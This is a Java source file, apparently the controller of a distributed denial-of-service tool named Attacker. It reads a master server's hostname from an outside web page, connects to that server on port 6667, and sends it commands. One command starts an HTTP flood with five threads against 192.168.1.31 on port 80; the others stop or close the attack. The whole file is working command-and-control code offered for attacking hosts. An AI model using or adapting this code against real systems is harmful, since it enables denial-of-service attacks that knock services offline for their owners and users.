/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package Attacker;

import ddos.DDOS;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class Attacker {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        
        System.out.println("Attacker - MAIN - START");
        
        try {
            URL url = new URL("http://muller.bru.free.fr/master.html");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String hostname = br.readLine();
            System.out.println("Master hostname: " + hostname);
            
            Socket s = new Socket(hostname, 6667);
            OutputStream os = s.getOutputStream();
            
            if ("--start".equals(args[1])) {
                send(os, "--start --target-hostname 192.168.1.31 --target-port 80 --method http --thread 5");
            } else if ("--stop-master".equals(args[1])) {
                send(os, "--stop-master");
            } else if ("--stop".equals(args[1])) {
                send(os, "--stop");
            } else if ("--close".equals(args[1])) {
                send(os, "--close");
            } else {
                DDOS.printHelp();
            }
                
            s.close(); 
             
        } catch (Exception ex) {
            Logger.getLogger(Attacker.class.getName()).log(Level.SEVERE, null, ex);
        } finally {                
            System.out.println("Attacker - MAIN - END");
        }
    }
    
    public static void send(OutputStream os, String s) throws IOException {
        System.out.println("Send: " + s);
        os.write(s.length());
        os.write(s.getBytes());
        os.flush();
    }
}
